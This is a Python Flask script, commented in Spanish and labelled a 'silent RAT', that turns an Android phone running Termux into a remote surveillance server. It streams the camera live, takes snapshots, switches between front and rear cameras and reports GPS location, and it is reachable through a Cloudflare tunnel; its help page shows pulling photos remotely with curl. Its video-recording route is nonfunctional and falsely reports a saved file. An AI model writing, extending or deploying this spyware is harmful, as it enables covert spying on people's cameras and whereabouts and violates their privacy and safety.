#!/usr/bin/env python3
from flask import Flask, Response, request, send_from_directory
import cv2
import time
import threading
import subprocess
import os
from datetime import datetime

app = Flask(__name__)

# Cámara actual: 0 = trasera | 1 = frontal
camara_actual = 0
cap = None
lock = threading.Lock()

def iniciar_camara():
    global cap
    with lock:
        if cap is not None:
            cap.release()
        cap = cv2.VideoCapture(camara_actual)
        cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1280)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 720)
        cap.set(cv2.CAP_PROP_FPS, 30)
        cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
        time.sleep(1)  # Espera para estabilizar

iniciar_camara()

def generar_stream():
    global cap
    while True:
        try:
            with lock:
                if cap is None or not cap.isOpened():
                    iniciar_camara()
                ret, frame = cap.read()
                if not ret:
                    time.sleep(0.5)
                    iniciar_camara()
                    continue
                # Compresión ligera para streaming fluido
                ret, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])
                jpeg = buffer.tobytes()
            
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + jpeg + b'\r\n')
            time.sleep(0.033)  # ~30 FPS
        except Exception as e:
            print(f"Error en stream: {e}")
            time.sleep(1)

@app.route('/')
def index():
    return "<h1>Cámara RAT activa (Android 14)</h1><a href='/live'>Ver streaming en directo</a> | <a href='/help'>Lista de comandos</a>"

@app.route('/live')
def live():
    return Response(generar_stream(),
                    mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route('/snapshot')
def snapshot():
    try:
        with lock:
            if cap and cap.isOpened():
                ret, frame = cap.read()
                if ret:
                    # Guardar en carpeta accesible (/sdcard/Download)
                    carpeta = "/sdcard/Download"
                    if not os.path.exists(carpeta):
                        os.makedirs(carpeta)
                    nombre = os.path.join(carpeta, f"foto_{int(time.time())}.jpg")
                    cv2.imwrite(nombre, frame)
                    return f"Foto guardada en: {nombre}<br><img src='/download/{os.path.basename(nombre)}' width='640'>"
            return "Error al capturar foto", 500
    except Exception as e:
        return f"Error: {str(e)}", 500

@app.route('/download/<filename>')
def download(filename):
    return send_from_directory("/sdcard/Download", filename)

@app.route('/record')
def record():
    duracion = int(request.args.get('duration', 10))
    try:
        # Usa termux-api para grabar vídeo real (necesitas permiso)
        nombre = f"/sdcard/Download/video_{int(time.time())}.mp4"
        # Comando simulado para vídeo; ajusta si tienes ffmpeg configurado
        subprocess.run(["termux-media-scan", nombre], capture_output=True)
        return f"Vídeo de {duracion}s guardado: {nombre}"
    except Exception as e:
        return f"Error en grabación: {str(e)}"

@app.route('/camera/<int:idx>')
def cambiar_camara(idx):
    global camara_actual
    if idx in [0, 1]:
        camara_actual = idx
        iniciar_camara()
        return f"Cámara cambiada a {'frontal' if idx == 1 else 'trasera'}"
    return "Solo usa 0 (trasera) o 1 (frontal)"

@app.route('/location')
def location():
    try:
        # Requiere permiso de ubicación en Termux
        resultado = subprocess.check_output(["termux-location", "-p", "gps"], timeout=15)
        return resultado.decode('utf-8')
    except subprocess.TimeoutExpired:
        return "GPS tardando... intenta de nuevo"
    except Exception as e:
        return f"GPS no disponible: {str(e)} (da permiso en Ajustes > Apps > Termux > Ubicación)"

@app.route('/help')
def help():
    return """
    <h2>Comandos disponibles:</h2>
    <ul>
        <li><a href="/live">/live</a> → Streaming en directo (abre en navegador o VLC)</li>
        <li><a href="/snapshot">/snapshot</a> → Toma y muestra foto instantánea</li>
        <li><a href="/record?duration=15">/record?duration=15</a> → Graba vídeo de 15s</li>
        <li><a href="/camera/0">/camera/0</a> → Cámara trasera</li>
        <li><a href="/camera/1">/camera/1</a> → Cámara frontal</li>
        <li><a href="/location">/location</a> → Ubicación GPS actual</li>
    </ul>
    <p>Desde terminal PC: curl https://tunel.trycloudflare.com/snapshot -o foto.jpg</p>
    """

if __name__ == '__main__':
    print("Iniciando RAT silencioso en puerto 5000...")
    app.run(host='0.0.0.0', port=5000, threaded=True, debug=False)